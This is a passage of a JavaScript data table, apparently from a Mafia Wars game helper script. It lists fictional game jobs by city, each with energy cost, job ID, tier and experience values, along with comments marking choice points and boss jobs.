    ['Rip Off the Armenian Mob'                          , 50, 64,8,NY     , 68,0,'     '],
    ['Muscle in on a Triad Operation'                    , 45, 65,8,NY     , 68,0,'     '],
    ['Ambush a Rival at a Sit Down'                      , 55, 66,8,NY     , 80,0,'     '],
    ['Order a Hit on a Public Official'                  , 35, 67,8,NY     , 55,0,'     '],
    ['Take Over an Identity Theft Ring'                  , 36, 68,8,NY     , 52,0,'     '],
    ['Settle a Beef... Permanently'                      , 35, 69,9,NY     , 74,0,'     '],
    ['Buy Off a Federal Agent'                           , 35, 70,9,NY     , 50,0,'     '],
    ['Make a Deal with the Mexican Cartel'               , 40, 71,9,NY     , 60,0,'     '],
    ['Blackmail the District Attorney'                   , 44, 72,9,NY     , 66,0,'     '],
    ['Shake Down a City Council Member'                  , 85, 73,9,NY     ,124,0,'     '],
    ['Make Arrangements for a Visiting Don'              , 40, 74,9,NY     , 60,0,'     '],
    ['Take Control of a Casino'                          , 70, 75,9,NY     ,110,0,'     '],
    ['Travel to the Old Country'                         , 52, 76,9,NY     , 82,0,'     '],
    ['Rob Your Cab Driver'                               , 12,  1,1,CUBA   , 16,0,'     '], // CUBA
    ['Secure A Safehouse'                                , 36,  2,1,CUBA   , 49,0,'     '],
    ['Intimidate The Locals'                             , 52,  3,1,CUBA   , 70,0,'     '],
    ['Silence a Noisy Neighbor'                          , 32,  4,1,CUBA   , 44,0,'     '],
    ['Smuggle In Some Supplies'                          , 34,  5,1,CUBA   , 45,0,'     '],
    ['Set Up A Numbers Racket'                           , 44,  6,1,CUBA   , 60,0,'     '],
    ['Establish Contact With The FRG'                    , 38,  7,1,CUBA   , 50,0,'     '],
    ['Take Out The Local Police Chief'                   , 41,  8,1,CUBA   , 55,0,'     '],
    ['"Persuade" A Local To Talk'                        , 51, 41,1,CUBA   , 69,0,'     '],
    ['Assault A Snitch\'s Hideout'                       , 56, 42,1,CUBA   , 75,0,'     '],
    ['Transport A Shipment of US Arms'                   , 42,  9,2,CUBA   , 59,0,'     '],
    ['Meet With The FRG Leadership'                      , 38, 10,2,CUBA   , 54,0,'     '],
    ['Hold Up A Tour Bus'                                , 45, 11,2,CUBA   , 65,0,'     '],
    ['Ambush A Military Patrol'                          , 51, 12,2,CUBA   , 72,0,'     '],
    ['Capture An Army Outpost'                           , 56, 13,2,CUBA   , 79,0,'     '],
    ['Sneak A Friend Of The Family Into The Country'     , 35, 14,2,CUBA   , 50,0,'     '],
    ['Ransack A Local Plantation'                        , 43, 15,2,CUBA   , 61,0,'     '],
    ['Burn Down A Hacienda'                              , 58, 16,2,CUBA   , 82,0,'     '],
    ['Offer "Protection" To A Nightclub'                 , 38, 17,3,CUBA   , 56,0,'     '],
    ['Rob The Banco Nacional Branch'                     , 52, 18,3,CUBA   , 77,0,'     '],
    ['Shake Down A Hotel Owner'                          , 40, 19,3,CUBA   , 58,0,'     '],
    ['Bring The Local Teamsters Under Your Control'      , 46, 20,3,CUBA   , 68,0,'     '],
    ['Help The FRG Steal A Truckload Of Weapons'         , 51, 21,3,CUBA   , 74,0,'     '],
    ['Hijack A Booze Shipment'                           , 45, 22,3,CUBA   , 67,0,'     '],
    ['Pillage A Shipyard'                                , 52, 23,3,CUBA   , 76,0,'     '],
    ['Take Over The Docks'                               , 60, 24,3,CUBA   , 88,0,'     '],
    ['Muscle In On A Local Casino'                       , 44, 25,4,CUBA   , 67,0,'     '],
    ['Establish A Loansharking Business'                 , 49, 26,4,CUBA   , 74,0,'     '],
    ['Eliminate A Rival Family\'s Agent'                 , 42, 27,4,CUBA   , 64,0,'     '],
    ['Pass On Some Intel To The FRG'                     , 45, 28,4,CUBA   , 67,0,'     '],
    ['Execute A Regional Arms Dealer'                    , 50, 29,4,CUBA   , 76,0,'     '],
    ['Sink A Competing Smuggler\'s Ship'                 , 52, 30,4,CUBA   , 78,0,'     '],
    ['Gun Down An Enemy Crew At The Airport'             , 56, 31,4,CUBA   , 85,0,'     '],
    ['Assassinate An Opposing Consigliere'               , 62, 32,4,CUBA   , 93,0,'     '],
    ['Raid The Arms Depot'                               , 53, 33,5,CUBA   , 81,0,'     '],
    ['Supply The FRG With Some Extra Muscle'             , 46, 34,5,CUBA   , 70,0,'     '],
    ['Capture The Airport'                               , 56, 35,5,CUBA   , 85,0,'     '],
    ['Knock Off A Visiting Head Of State'                , 52, 36,5,CUBA   , 79,0,'     '],
    ['Set Up A High Volume Smuggling Operation'          , 55, 37,5,CUBA   , 85,0,'     '],
    ['Blow Up A Rail Line'                               , 50, 38,5,CUBA   , 77,0,'     '],
    ['Attack The Army Command Post'                      , 58, 39,5,CUBA   , 88,0,'     '],
    ['Storm The Presidential Palace'                     , 70, 40,5,CUBA   ,106,0,'     '],
    ['Arrange A New York Drug Shipment'                  , 62, 43,6,CUBA   , 95,0,'     '],
    ['Launder Money Through A Resort'                    , 72, 44,6,CUBA   ,110,0,'     '],
    ['Loot The National Museum'                          , 78, 45,6,CUBA   ,117,0,'     '],
    ['Send Some Help Home To New York'                   , 64, 46,6,CUBA   , 98,0,'     '],
    ['Take Over The Havana Reconstruction'               , 82, 47,6,CUBA   ,123,0,'     '],
    ['Help Get An Associate A No Bid Contract'           , 56, 48,6,CUBA   , 85,0,'     '],
    ['Trans-Ship A Container Full of Refugees'           , 48, 49,6,CUBA   , 73,0,'     '],
    ['Meet With "The Russian"'                           , 58, 50,6,CUBA   , 89,0,'     '],
    ['Smuggle Consumer Electronics for the Vory'         , 46,  1,1,MOSCOW , 61,0,'     '], // MOSCOW EPISODE 1
    ['Arrange A Drug Shipment for the Mafiya'            , 40,  2,1,MOSCOW , 53,0,'     '],
    ['Fight Off An Ultra-National Gang'                  ,112,  3,1,MOSCOW ,115,0,'     '],
    ['Kidnap A Local Gang Leader for the Vory'           , 47,  4,1,MOSCOW , 63,0,'     '], // CHOICE POINT (Vory = 4, Mafia = 7)
  //['Kill A Local Gang Leader for the Mafiya'           , 47,  7,1,MOSCOW , 63,0,'     '],
    ['Collect The Ransom'                                , 50,  5,1,MOSCOW , 64,0,'     '], // CHOICE RESULT (Vory)
    ['Receive Vory Intel On Dmitri'                      , 40,  6,1,MOSCOW , 54,0,'     '], // CHOICE RESULT (Mafia)
  //['Collect the Hit Payoff'                            , 56,  8,1,MOSCOW , 76,0,'     '],
  //['Buy Mafiya Intel On Dmitri'                        , 52,  9,1,MOSCOW , 74,0,'     '],
    ['Threaten A Gang\'s Supplier'                       , 58, 10,1,MOSCOW , 79,0,'     '],
    ['Hijack An Arms Shipment From A Militant Gang'      , 67, 11,1,MOSCOW , 90,0,'     '],
    ['Hospitalize Some Nationalists'                     , 76, 12,1,MOSCOW ,104,0,'     '],
    ['Confront Gang Leader Dmitri Leonov'                ,  1, 13,1,MOSCOW ,  3,0,'     '],
    ['Bribe An Election Official'                        , 57, 14,2,MOSCOW , 77,0,'     '], // MOSCOW EPISODE 2
    ['Silence A Political Critic'                        , 53, 15,2,MOSCOW , 73,0,'     '],
    ['Violently Break Up A Campaign Rally'               ,137, 16,2,MOSCOW ,141,0,'     '],
    ['Fix A Local Election for the Vory'                 , 66, 17,2,MOSCOW , 91,0,'     '], // CHOICE POINT (Vory = 17, Mafia = 20)
  //['Abduct A Candidate\'s Wife For the Mafiya'         , 66, 20,2,MOSCOW , 89,0,'     '],
    ['Extract A Favor From The Winner'                   , 97, 18,2,MOSCOW ,128,0,'     '], // CHOICE RESULT (Vory)
    ['Catch Karpov Accepting A Bribe'                    , 77, 19,2,MOSCOW ,105,0,'     '],
  //['"Convince" The Candidate To Withdraw'              , 90, 21,2,MOSCOW ,126,0,'     '], // CHOICE RESULT (Mafia)
  //['Kill An Investigative Reporter'                    , 75, 22,2,MOSCOW ,107,0,'     '],
    ['Pay Off The Port Authority In Arkhangelsk'         , 57, 23,2,MOSCOW , 77,0,'     '],
    ['Re-route An Equipment Shipment'                    , 80, 24,2,MOSCOW ,106,0,'     '],
    ['Circulate Damaging Photos'                         , 99, 25,2,MOSCOW ,137,0,'     '],
    ['Take Down Party Boss Karpov'                       ,  1, 26,2,MOSCOW ,  3,0,'     '],
    ['Case The RossijaBanc Building'                     , 65, 31,3,MOSCOW , 88,0,'     '], // MOSCOW EPISODE 3
    ['Map Out The Escape Route'                          , 80, 32,3,MOSCOW ,108,0,'     '],
    ['Rob The RossijaBanc Central Repository'            ,165, 33,3,MOSCOW ,172,0,'     '],
    ['Take A Guard Hostage During Your Escape'           , 82, 34,3,MOSCOW ,112,0,'     '], // CHOICE POINT (Vory = 34, Mafia = 37)
  //['Execute A Bank Guard During Your Escape'           , 82, 37,3,MOSCOW ,112,0,'     '],
    ['Use The Guard\'s Keys To Access the Bank Armory'   ,105, 35,3,MOSCOW ,140,0,'     '], // CHOICE RESULT (Vory)
    ['"Borrow" The Guard\'s Uniform After Releasing Him' , 88, 36,3,MOSCOW ,117,0,'     '],
  //['Steal The Bank President\'s Car Keys'              , 99, 38,3,MOSCOW ,132,0,'     '], // CHOICE RESULT (Mafia)
  //['Strip A Uniform Off The Corpse'                    , 91, 39,3,MOSCOW ,121,0,'     '],
    ['Blackmail A Secretary For An Exec\'s Itinerary'    , 96, 40,3,MOSCOW ,129,0,'     '],
    ['Dispose Of A RossijaBanc Exec At Sea'              , 89, 41,3,MOSCOW ,118,0,'     '],
    ['Replace A Guard With Your Own Man'                 ,118, 42,3,MOSCOW ,165,0,'     '],
    ['"Fire" Bank President Gregor Belikov'              ,  1, 43,3,MOSCOW ,  3,0,'     '],
    ['Manage An Escort Service Catering to Soldiers'     ,111, 44,4,MOSCOW ,151,0,'     '], // MOSCOW EPISODE 4
    ['Support The Habit Of A Procurement Officer'        ,125, 45,4,MOSCOW ,170,0,'     '],
    ['Ransack A Defense Contractor\'s Office'            ,198, 46,4,MOSCOW ,210,0,'     '],
    ['Fly To The Siberian Military District'             ,118, 47,4,MOSCOW ,161,0,'     '], // CHOICE POINT (Vory = 47, Mafia = 50)
  //['Travel To The Volga Military District'             ,118, 50,4,MOSCOW ,161,0,'     '],
    ['Rob A Troop Convoy'                                ,108, 48,4,MOSCOW ,143,0,'     '], // CHOICE RESULT (Vory)
    ['Intercept The Base\'s Pay Shipment'                ,105, 49,4,MOSCOW ,143,0,'     '],
  //['Arrange The Sale Of Weapons-Grade Explosives'      ,119, 51,4,MOSCOW ,158,0,'     '], // CHOICE RESULT (Mafia)
  //['Capitalize On An Officer\'s Gambling Problem'      ,107, 52,4,MOSCOW ,146,0,'     '],
    ['Make Connections With An Arms Dealer'              ,123, 53,4,MOSCOW ,168,0,'     '],
    ['Transport Some Stolen Military Hardware'           ,125, 54,4,MOSCOW ,165,0,'     '],
    ['Buy Off The General\'s Command Team'               ,134, 55,4,MOSCOW ,188,0,'     '],
    ['Forcibly Demote General Osipov'                    ,  1, 56,4,MOSCOW ,  3,0,'     '],
    ['Stop A Terrorist Attack In Moscow'                 ,116, 61,5,MOSCOW ,159,0,'     '],  // MOSCOW EPISODE 5
    ['Discover Who Was Responsible'                      ,124, 62,5,MOSCOW ,170,0,'     '],
    ['Hunt Down A Ural Liberation Front Contact'         ,215, 63,5,MOSCOW ,230,0,'     '],
    ['Infiltrate The ULF Cell'                           ,132, 64,5,MOSCOW ,181,0,'     '], // CHOICE POINT (Vory = 64, Mafia = 67)
  //['Discover The Location Of The Next ULF Attack'      ,132, 67,5,MOSCOW ,181,0,'     '], // CHOICE RESULT (Vory)
    ['Help "Plan" The Next Attack'                       ,121, 65,5,MOSCOW ,160,0,'     '],
    ['Sabotage The Plan From The Inside'                 ,127, 66,5,MOSCOW ,174,0,'     '],
  //['Kill A Lookout'                                    ,127, 68,5,MOSCOW ,170,0,'     '], // CHOICE RESULT (Mafia)
  //['Stop The ULF Attack'                               ,131, 69,5,MOSCOW ,180,0,'     '],
    ['Torture A ULF Lieutenant'                          ,120, 70,5,MOSCOW ,164,0,'     '],
    ['Look For The Boss\' Mountain Hideout'              ,135, 71,5,MOSCOW ,180,0,'     '],
    ['Start An Avalanche Above The Terrorist Camp'       ,145, 72,5,MOSCOW ,205,0,'     '],
    ['Battle Sonya "The Wolf" Bassinov'                  ,  1, 73,5,MOSCOW ,  3,0,'     '],
    ['Foil The Sabotage Of Your Moscow Holdings'         ,130, 74,6,MOSCOW ,180,0,'     '], // MOSCOW EPISODE 6
    ['Acquire Classified Files On Crime Syndicates'      ,122, 75,6,MOSCOW ,169,0,'     '],
    ['Gun Down Some Russian Muscle'                      ,238, 76,6,MOSCOW ,258,0,'     '],
    ['Attack A Mafiya Business'                          ,136, 77,6,MOSCOW ,188,0,'     '], // CHOICE POINT (Vory = 77, Mafia = 80)
  //['Burn Down A Vory Safehouse'                        ,136, 80,6,MOSCOW ,188,0,'     '],
    ['Hijack A Mafiya Cargo'                             ,134, 78,6,MOSCOW ,179,0,'     '], // CHOICE RESULT (Vory)
    ['Threaten A Mafiya Moneyman\'s Family'              ,128, 79,6,MOSCOW ,176,0,'     '], // CHOICE RESULT (Mafia)
  //['Hit A Vory Nightclub'                              ,128, 81,6,MOSCOW ,171,0,'     '],
  //['Break Into An Architect\'s Office'                 ,134, 82,6,MOSCOW ,185,0,'     '],
    ['Take Over A West-Bound Trafficking Pipeline'       ,140, 83,6,MOSCOW ,194,0,'     '],
    ['Ship Black-Market Caviar To London'                ,137, 84,6,MOSCOW ,189,0,'     '],
    ['Assault The Mansion Walls'                         ,148, 85,6,MOSCOW ,211,0,'     '],
    ['Take Out Viktor "Sibirchik" Titov'                 ,  1, 86,6,MOSCOW ,  3,0,'     '],
    ['Move Stolen Art Through Suvarnabhumi Airport'      , 71,  1,1,BANGKOK,111,0,'     '], // BANGKOK EPISODE 1
    ['Show A Cocky Biker Who\'s In Charge'               , 63,  2,1,BANGKOK,101,0,'     '],
    ['Take On Local Motorcycle Thugs'                    ,189,  3,1,BANGKOK,253,0,'     '],
    ['Meet A Gang\'s Rep In A Go-Go Bar'                 , 78,  5,1,BANGKOK,120,0,'     '], // CHOICE POINT (Yakuza = 5, Triad = 8)
    ['Torch A Building For Insurance'                    ,110,  6,1,BANGKOK,172,0,'     '], // Yakuza
    ['Arrange An "Accident" For A Witness'               , 71,  7,1,BANGKOK,111,0,'     '], // Yakuza
    ['Raid One Of Suchart\'s Gambling Dens'              , 91,  9,1,BANGKOK,133,0,'     '], // Triad
    ['Trash The Low-Rent Casino'                         , 71, 10,1,BANGKOK,102,0,'     '], // Triad
    ['Intercept An Ammo Shipment'                        , 65, 11,1,BANGKOK, 94,0,'     '], // CHOICE POINT (Yakuza = 11, Triad = 14)
    ['Deliver It To A Japanese Front Company'            , 94, 12,1,BANGKOK,130,0,'     '], // Yakuza
    ['Pay Off A Corrupt Police Officer'                  , 64, 13,1,BANGKOK, 91,0,'     '], // Yakuza
    ['Sneak It On To A Chinese Cargo Ship'               , 71, 15,1,BANGKOK,102,0,'     '], // Triad
    ['Bribe A Dock Guard'                                , 52, 16,1,BANGKOK, 78,0,'     '], // Triad
    ['Blow Up Suchart\'s Warehouse'                      ,111, 17,1,BANGKOK,164,0,'     '],
    ['Take Down Boss Suchart'                            ,  1, 18,1,BANGKOK,  3,0,'     '],
    ['Force A Local Landowner To Sell'                   , 67, 20,2,BANGKOK, 95,0,'     '],  // BANGKOK EPISODE 2
    ['Receive A Kickback From The Buyer'                 , 73, 21,2,BANGKOK,102,0,'     '],
    ['Attack A Paramilitary Police Post'                 ,136, 22,2,BANGKOK,167,0,'     '],
    ['Set Up A Phony Business'                           , 62, 24,2,BANGKOK, 89,0,'     '], // CHOICE POINT (Yakuza = 24, Triad = 27)
    ['Re-Route A Van Full Of Medical Supplies'           , 52, 25,2,BANGKOK, 64,0,'     '], // Yakuza
    ['Resell The Stolen Supplies'                        , 52, 26,2,BANGKOK, 64,0,'     '], // Yakuza
    ['Set Up A Bogus Chess Tournament'                   , 57, 28,2,BANGKOK, 77,0,'     '], // Triad
    ['Rob The Chess Masters'                             , 51, 29,2,BANGKOK, 72,0,'     '], // Triad
    ['Pay Off The Guards At Bangkwang Prison'            , 47, 30,2,BANGKOK, 65,0,'     '], // CHOICE POINT (Yakuza = 30, Triad = 33)
    ['Sneak A Yakuza Enforcer In'                        , 40, 31,2,BANGKOK, 48,0,'     '], // Yakuza
    ['Help Stage An Accident For A Tong Inmate'          , 36, 32,2,BANGKOK, 44,0,'     '], // Yakuza
    ['Break A Triad Hitman Out'                          , 57, 34,2,BANGKOK, 77,0,'     '], // Triad
    ['Help Rub Out A Bosozoku Leader'                    , 62, 35,2,BANGKOK, 89,0,'     '], // Triad
    ['Expose A Crooked Royal Thai Police Officer'        , 94, 36,2,BANGKOK,132,0,'     '],
    ['Discredit Police Commissioner Chatri'              ,  1, 37,2,BANGKOK,  3,0,'     '],
    ['Secure A Pirate Vessel'                            , 43, 39,3,BANGKOK, 46,0,'     '], // CHAPTER 1 // BANGKOK EPISODE 3
    ['Hire An Unsavory Crew'                             , 35, 40,3,BANGKOK, 53,0,'     '], // CHAPTER 1
    ['Take Down A Rival Pirate Outfit'                   ,106, 41,3,BANGKOK,146,0,'     '], // CHAPTER 1  HELP JOB
    ['Hijack A Boat Load Of Electronics'                 , 35, 43,3,BANGKOK, 53,0,'     '], // CHAPTER 2  CHOICE POINT (Yakuza = 43, Triad = 46)
    ['Truck The Cargo To Kuala Lumpur'                   , 60, 44,3,BANGKOK, 93,0,'     '], // CHAPTER 2  Yakuza
    ['Smuggle Cigarettes Back Into Thailand'             , 60, 45,3,BANGKOK, 93,0,'     '], // CHAPTER 2  Yakuza
    ['Ship The Cargo To Jakarta'                         , 49, 47,3,BANGKOK, 75,0,'     '], // CHAPTER 2  Triad
    ['Return With A Shipment Of Weapons'                 , 49, 48,3,BANGKOK, 75,0,'     '], // CHAPTER 2  Triad
    ['Steal Shipping Manifests'                          , 46, 49,3,BANGKOK, 71,0,'     '], // CHAPTER 3  CHOICE POINT (Yakuza = 49, Triad = 52)
    ['Steal Japanese Auto Shipping Containers'           , 56, 53,3,BANGKOK, 88,0,'     '], // CHAPTER 3  Triad
    ['Offload The Cars Onto A Waiting Barge'             , 60, 54,3,BANGKOK, 93,0,'     '], // CHAPTER 3  Triad
    ['Hire Divers To Retrieve The Gold Bars'             , 49, 51,3,BANGKOK, 75,0,'     '], // CHAPTER 3  Yakuza
    ['Sink A Chinese Metals Freighter'                   , 53, 50,3,BANGKOK, 84,0,'     '], // CHAPTER 3  Yakuza
    ['Sink A Fleet Vessel'                               ,107, 55,3,BANGKOK,135,0,'     '], // FINALE
    ['Send Captain Mok Overboard'                        ,  1, 56,3,BANGKOK,  3,0,'     '], // BOSS JOB
    ['Buy Some Chemicals On The Black Market'            , 68, 58,4,BANGKOK, 84,0,'     '], // CHAPTER 1  //  BANGKOK EPISODE 4
    ['Make Contact With The United Wa State Army'        , 52, 59,4,BANGKOK, 64,0,'     '], // CHAPTER 1
    ['Ambush A Burmese Army Convoy'                      ,144, 60,4,BANGKOK,160,0,'     '], // CHAPTER 1  HELP JOB
    ['Establish Contact With A CIA Agent'                , 48, 62,4,BANGKOK, 60,0,'     '], // CHAPTER 2  CHOICE POINT (Yakuza = 62, Triad = 65)
    ['Arrange To Process It In Bangkok'                  , 80, 64,4,BANGKOK,100,0,'     '], // CHAPTER 2  Yakuza
    ['Set Up An Opium Shipment'                          , 76, 63,4,BANGKOK, 92,0,'     '], // CHAPTER 2  Yakuza
    ['Set Up The Import Of Illegal Chinese Arms'         , 64, 66,4,BANGKOK, 80,0,'     '], // CHAPTER 2  Triad
    ['Ship The Yaa Baa Payment To Phuket'                , 60, 67,4,BANGKOK, 76,0,'     '], // CHAPTER 2  Triad
    ['Betray Commander Chang and the UWSA'               , 52, 68,4,BANGKOK, 64,0,'     '], // CHAPTER 3  CHOICE POINT (Yakuza = 68, Triad = 71)
    ['Steal A Seized Drug Shipment'                      , 64, 70,4,BANGKOK, 80,0,'     '], // CHAPTER 3  Yakuza
    ['Pass On Information To The Thai Police'            , 44, 69,4,BANGKOK, 56,0,'     '], // CHAPTER 3  Yakuza
    ['Eliminate An Insurgent Escort'                     , 60, 72,4,BANGKOK, 72,0,'     '], // CHAPTER 3  Triad
    ['Make Off With Stolen Military Hardware'            , 56, 73,4,BANGKOK, 68,0,'     '], // CHAPTER 3  Triad
    ['Attack Chang\'s Heroin-Processing Facility'        , 88, 74,4,BANGKOK,112,0,'     '], // FINALE
    ['Kill Commander Chang'                              ,  1, 75,4,BANGKOK,  3,0,'     '], // BOSS JOB
    ['Ship Burmese Sapphires Into Thailand'              , 72, 77,5,BANGKOK, 92,0,'     '], // CHAPTER 1  // BANGKOK EPISODE 5A-Oyabun
    ['Smuggle The Sapphires Into Tokyo'                  , 52, 78,5,BANGKOK, 68,0,'     '], // CHAPTER 1
    ['Fight Off A Minato-Kai Sponsored Hit'              ,168, 79,5,BANGKOK,188,0,'     '], // CHAPTER 1  HELP JOB
    ['Meet With Boss Matsumura\'s Advisor'               , 56, 81,5,BANGKOK, 72,0,'     '], // CHOICE POINT CHAPTER 2 (Yakuza = 81, Triad = 84)
    ['Help Broker A Minato-Matsumura Peace'              , 68, 82,5,BANGKOK, 88,0,'     '], // CHAPTER 2  Yakuza
    ['Take A Piece Of The Kabukicho Action'              , 68, 83,5,BANGKOK, 88,0,'     '], // CHAPTER 2  Yakuza
    ['Assassinate The Minato-Kai Family Head'            , 64, 85,5,BANGKOK,102,0,'     '], // CHAPTER 2  Triad
    ['Frame An Enemy For The Murder'                     , 67, 86,5,BANGKOK,106,0,'     '], // CHAPTER 2  Triad
    ['Talk With A Police Insider About Matsumura'        , 40, 87,5,BANGKOK, 52,0,'     '], // CHOICE POINT CHAPTER 3 (Yakuza = 87, Triad = 90)
    ['Gather More Evidence Of A Betrayal'                , 80, 88,5,BANGKOK,104,0,'     '], // CHAPTER 3  Yakuza
    ['Get The Support Of The Yakuza Families'            , 84, 89,5,BANGKOK,108,0,'     '], // CHAPTER 3  Yakuza
    ['Spread Distrust Among The Yakuza Families'         , 78, 91,5,BANGKOK,124,0,'     '], // CHAPTER 3  Triad
    ['Start A War Between Matsumura and Minato'          , 78, 92,5,BANGKOK,124,0,'     '], // CHAPTER 3  Triad
    ['Remove Matsumura\'s Loyal Lieutenants'             ,104, 93,5,BANGKOK,132,0,'     '], // FINALE
    ['Execute Oyabun Matsumura'                          ,  1, 94,5,BANGKOK,  3,0,'     '], // BOSS JOB
    ['Set Up A Drug Shipment To China'                   , 49, 96,6,BANGKOK, 79,0,'     '], // CHAPTER 1  // BANGKOK EPISODE 5B-Dragon Head
    ['Dodge Customs At The Port of Hong Kong'            , 64, 97,6,BANGKOK,102,0,'     '], // CHAPTER 1
    ['Win A Shoot-Out With The Kowloon Police'           ,149, 98,6,BANGKOK,208,0,'     '], // CHAPTER 1  HELP JOB
    ['Intimidate Wealthy Expatriates'                    , 64,100,6,BANGKOK,102,0,'     '], // CHOICE POINT CHAPTER 2 (Yakuza = 100, Triad = 103)
    ['Make An Example Of A Wealthy Industrialist'        , 64,101,6,BANGKOK,102,0,'     '], // CHAPTER 2  Yakuza
    ['Fence The Goods Stolen From The Mansion'           , 60,102,6,BANGKOK, 97,0,'     '], // CHAPTER 2  Yakuza
    ['Extort The Head Of The Hong Kong Polo Club'        , 67,104,6,BANGKOK,106,0,'     '], // CHAPTER 2  Triad
    ['Fix The Hong Kong Polo Invitational'               , 64,105,6,BANGKOK,102,0,'     '], // CHAPTER 2  Triad
    ['Talk With Wei\'s Disloyal Enforcers'               , 71,106,6,BANGKOK,115,0,'     '], // CHOICE POINT CHAPTER 3 (Yakuza = 106, Triad = 109)
    ['Sneak An Industrial Spy Into Hong Kong'            , 64,107,6,BANGKOK,102,0,'     '], // CHAPTER 3  Yakuza
    ['Break In To Cheng-Wei Ballistics'                  , 67,108,6,BANGKOK,106,0,'     '], // CHAPTER 3  Yakuza
    ['Kidnap One Of Wei\'s Trusted Advisors'             , 56,110,6,BANGKOK, 88,0,'     '], // CHAPTER 3  Triad
    ['Bury The Body Under A Construction Site'           , 60,111,6,BANGKOK, 97,0,'     '], // Chapter 3  Triad
    ['Attack Wei\'s Gambling Halls'                      , 96,112,6,BANGKOK,155,0,'     '], // FINALE
    ['Dispose Of Mountain Master Wei'                    ,  1,113,6,BANGKOK,  3,0,'     '], // BOSS JOB
    ['Shore Up Control Of Your New Territory'            , 60,115,7,BANGKOK, 97,0,'     '], // CHAPTER 1 // BANGKOK EPISODE 6-Saboteur
    ['Spread The Wealth To Your New Lieutenants'         , 71,116,7,BANGKOK,115,0,'     '], // CHAPTER 1
    ['Eliminate The Last Traces Of Resistance'           ,145,117,7,BANGKOK,199,0,'     '], // CHAPTER 1  HELP JOB
    ['Get A Gang Member Back Into Thailand'              , 71,119,7,BANGKOK,115,0,'     '], // CHOICE POINT CHAPTER 2 (Yakuza = 119, Triad = 122)
    ['Break Into A Goverment Research Facility'          , 74,120,7,BANGKOK,119,0,'     '], // CHAPTER 2  Yakuza
    ['Steal An Experimental Armor Prototype'             , 67,121,7,BANGKOK,106,0,'     '], // CHAPTER 2  Yakuza
    ['Kidnap A Trade Consortium Leader'                  , 74,123,7,BANGKOK,119,0,'     '], // CHAPTER 2  Triad
    ['Extort The Consortium\'s Remaining Officers'       , 64,124,7,BANGKOK,102,0,'     '], // CHAPTER 2  Triad
    ['Undermine Nongchai\'s Support'                     , 78,125,7,BANGKOK,124,0,'     '], // CHOICE POINT CHAPTER 3 (Yakuza = 125, Triad = 128)
    ['Acquire Information On A Government Supporter'     , 71,126,7,BANGKOK,115,0,'     '], // CHAPTER 3  Yakuza
    ['Assassinate A Bangkok Council Member'              , 67,127,7,BANGKOK,106,0,'     '], // CHAPTER 3  Yakuza
    ['Bribe A Royal Thai Army Colonel'                   , 74,129,7,BANGKOK,119,0,'     '], // CHAPTER 3  Triad
    ['Route A Drug Shipment Through An Army Post'        , 64,130,7,BANGKOK,102,0,'     '], // Chapter 3  Triad
    ['Infiltrate The Parliament House'                   , 85,131,7,BANGKOK,137,0,'     '], // FINALE
    ['Depose Prime Minister Nongchai'                    ,  1,132,7,BANGKOK,  3,0,'     '], // BOSS JOB
    ['Consolidate Political Power In Bangkok'            , 56,134,8,BANGKOK, 93,0,'     '], // CHAPTER 1  // BANGKOK EPISODE 7-Assassin
    ['Take Over The Royal Bank Of Thailand'              , 64,135,8,BANGKOK, 97,0,'     '], // CHAPTER 1
    ['Foil An Attempt On Your Life'                      ,156,136,8,BANGKOK,222,0,'     '], // CHAPTER 1  HELP JOB
    ['Question The Surviving Assassin'                   , 74,138,8,BANGKOK,115,0,'     '], // CHAPTER 2
    ['Gather Information On The Shadow King'             , 71,139,8,BANGKOK,115,0,'     '], // CHAPTER 2
    ['Eliminate A Spy For The Shadow King'               , 85,140,8,BANGKOK,133,0,'     '], // CHAPTER 2
    ['Hire A Guide To Find The Temple of Shadows'        , 64,141,8,BANGKOK,102,0,'     '], // CHAPTER 3
    ['Fight Off A Hill Tribe Loyal To The Shadow King'   , 89,142,8,BANGKOK,142,0,'     '], // CHAPTER 3
    ['Silence A Shadow Kingdom Patrol'                   , 81,143,8,BANGKOK,133,0,'     '], // CHAPTER 3
    ['Battle Your Way Through The Temple'                , 96,144,8,BANGKOK,159,0,'     '], // FINALE
    ['Overthrow The Shadow King'                         ,  1,145,8,BANGKOK,  3,0,'     '], // BOSS JOB
///////////////////////////////////////////////////////////////////////////////////////////// DONT forget the comma above
//     60 jobs, 6 boss, 11 fight, 6 social, 37 energy
//      7                                                   5   4 2   1       6 3   0                PATH
    ['Move Your Crew Into A Safe House'                  ,  9,  1,1,LV    ,  7,0,'node1' ],    // ENERGY DISTRICT 1  LAS VEGAS NORTH LAS VEGAS
    ['Blackmail A Car Dealer'                            ,  8,  2,1,LV    , 11,0,'node2' ],    // ENERGY
    ['Steal A Truckload Of Slots'                        , 24,  3,1,LV    , 18,0,'node3' ],    // ENERGY
    ['Secure Some Wheels'                                , 18,  4,1,LV    , 25,0,'node4' ],    // ENERGY
    ['Roll a Bingo Parlor'                               ,  6,  5,1,LV    ,  9,1,'node5' ],    //  FIGHT
    ['Break Into A Gun Shop'                             , 12,  6,1,LV    , 16,0,'node6' ],    // ENERGY
    ['Scout Out Alphabet City'                           , 15,  7,1,LV    , 20,0,'node7' ],    // ENERGY
    ['Open Fire On Victor&amp;\'s Crew'                  , 23,  8,1,LV    , 27,0,'node8' ],    //SOCIAL
//   ['Boss: Defeat Victor Lil\' Loco Alves'             ,  5,  9,1,LV    ,  6,0,'node9' ],    //        BOSS JOB STAMINA
    ['Help A Bookie Out Of A Jam'                        , 15, 10,2,LV    ,  9,0,'node10'],    // ENERGY DISTRICT 2  LAS VEGAS PARADISE CITY
    ['Win An Underground Fight'                          , 11, 11,2,LV    , 18,1,'node11'],    //  FIGHT
    ['Clip A Petty Thug'                                 , 10, 12,2,LV    , 16,1,'node12'],    //  FIGHT
    ['Fix A Boxing Match'                                , 11, 13,2,LV    , 15,0,'node13'],    // ENERGY
    ['Clean Up At A Rigged Table'                        , 10, 14,2,LV    , 14,0,'node14'],    // ENERGY
    ['Recruit A Table Game Dealer'                       ,  9, 15,2,LV    , 12,0,'node15'],    // ENERGY (PROPERTY)
    ['Strong-Arm A Limo Company'                         , 14, 16,2,LV    , 18,0,'node16'],    // ENERGY
    ['Shut Down An Uncooperative Club'                   , 15, 17,2,LV    , 20,0,'node17'],    // ENERGY
    ['Hit Up A Nightclub'                                ,  7, 18,2,LV    ,  9,0,'node18'],    // ENERGY
//  ['Boss: Defeat Jimmy \'Big Time\' Mancuso'           ,  5, 19,2,LV    , 70,0,'node19'],    //        BOSS JOB STAMINA
